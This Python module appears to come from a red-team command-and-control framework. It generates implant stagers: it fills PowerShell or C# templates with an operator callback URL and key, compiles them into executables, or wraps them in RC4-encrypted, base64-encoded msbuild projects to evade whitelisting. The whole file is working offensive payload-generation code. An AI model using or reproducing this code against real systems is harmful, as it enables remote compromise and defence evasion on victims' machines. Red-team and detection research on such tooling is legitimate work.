#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/payload.py
"""

import os
import base64
from core.utils import Utils
from core.rc4 import RC4

class Payload:

    DEFAULT_DELAY = 10000
    DEFAULT_TYPE = "ps1"

    def __init__(self, config):
        self.config = config
        self.type = {}
        self.type["ps1"] = "stager.ps1"

        # self.type["js"] = "stager.ps1"
        # self.type["hta"] = "stager.ps1"

        self.type["exe"] = "../bin/stager.cs"
        self.type["cs"] = "../bin/stager.cs"
        self.type["msbuild"] = "stager.ps1"

        self.delay = Payload.DEFAULT_DELAY
        self.option = Payload.DEFAULT_TYPE

    def set_type(self, type):
        if type in self.type:
            self.option = type

    def set_delay(self, delay):
        try:
            self.delay = int(delay)
        except:
            self.delay = Payload.DEFAULT_DELAY

    def set_callback(self, url):
        if url != "__default__" and url != "":
            self.callback_url = Utils.url_decode(url)
        else:
            self.callback_url = self.get_url()

    def get_output(self):
        output = Utils.load_powershell_script(self.type[self.option], 999)
        output = output.replace("[URL]", self.callback_url).replace("[KEY]", self.config.get("encryption-key")).replace("[DELAY]", str(self.delay))
        if self.option == "exe":
            output = self.compile_exe(output)
        if self.option == "msbuild":
            output = self.generate_msbuild(output)
        return output

    def compile_exe(self, data):
        output = ""
        filename = "/tmp/%s" % Utils.gen_str(10)
        open(filename, "w+").write(data)
        cmdline = \
            "mcs %s -out:%s.exe -r:bin/System.Drawing.dll -r:bin/System.Management.Automation.dll -r:bin/System.Web.Extensions.dll -r:bin/System.Windows.Forms.dll > /dev/null 2>&1" \
            % (filename, filename)

        os.system(cmdline)
        output = open("%s.exe" % filename, "rb").read()
        os.remove(filename)
        os.remove("%s.exe" % filename)

        return output

    def generate_msbuild(self, ps):
        msbuild = Utils.load_powershell_script("../bin/stager.csproj", 999)
        rc4_key = RC4.gen_rc4_key(32)
        hex_rc4_key = RC4.format_rc4_key(rc4_key)
        rc4 = RC4(rc4_key)
        data = base64.b64encode(rc4.crypt(ps))
        return msbuild.replace("[PAYLOAD]", data).replace("[KEY]", hex_rc4_key)

    def get_url(self):
        return self.config.get("callback-url")
